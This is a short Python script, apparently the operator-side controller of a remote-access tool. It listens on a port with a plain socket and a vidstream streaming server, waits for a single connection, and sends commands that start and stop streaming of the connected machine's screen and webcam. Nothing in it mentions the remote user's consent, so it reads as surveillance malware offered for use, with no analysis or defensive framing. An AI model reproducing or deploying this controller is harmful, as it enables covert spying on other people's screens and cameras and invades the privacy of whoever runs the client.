import socket
from vidstream import *
import os

host = 'local_ip'
port = 49494


server = StreamingServer(host, 49495)
server.start_server()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind((host, port))

s.listen(1)

print(f'SERVER WAS CREATED\n[IP] : {host}\n[PORT] : {port}')



print("Ожидание входящих соединений...")

conn, addr = s.accept()
print(f"Соединение установлено с {addr}")


def MAIN():
    try:
        while True:


            command = input(">>>")

            if command.lower() == 'get_screen':

                data = bytes(command, 'UTF-8')
                conn.send(data)

                print('SCREEN SERVER WAS SUCCESFULLY STARTED')

            elif command.lower() == 'get_web':
                data = bytes(command, 'UTF-8')
                conn.send(data)
            elif command.lower() == 'get_screen_stop':
                data = bytes(command, 'UTF-8')
                conn.send(data)
                print('SCREEN STREAMING STOPPED')
            elif command.lower() == 'get_web_stop':
                data = bytes(command, 'UTF-8')
                conn.send(data)
                print('WEB STREAMING STOPPED')

            elif command.lower() == 'cls':
                os.system('cls')
            elif command.lower() == 'exit':
                data = bytes(command, 'UTF-8')
                conn.send(data)
                conn.send(data)

                server.stop_server()
                s.close()

                break

    except:
        print('ERROR')
MAIN()

        
